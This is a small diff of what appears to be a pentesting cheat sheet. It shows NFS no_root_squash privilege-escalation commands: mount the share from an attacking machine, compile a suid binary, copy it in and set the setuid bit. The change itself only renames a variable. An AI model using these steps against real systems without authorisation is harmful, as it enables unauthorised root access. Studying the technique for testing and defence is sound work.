@@ -144,7 +144,7 @@ no_root_squash?
 ](https://recipeforroot.com/attacking-nfs-shares/)  
 **[On Attacking Machine]**  
 mkdir -p /**mnt**/**nfs**/  
-mount  **-t**  nfs  **-o**  **vers**=<version 1,2,3>  **$IP:**<NFS Share> /**mnt**/**nfs**/  **-nolock**  
+mount  **-t**  nfs  **-o**  **vers**=<version 1,2,3>  **$ip:**<NFS Share> /**mnt**/**nfs**/  **-nolock**  
 gcc suid.c  **-o**  suid  
 cp suid /**mnt**/**nfs**/  
 chmod u+s /**mnt**/**nfs**/**suid**  
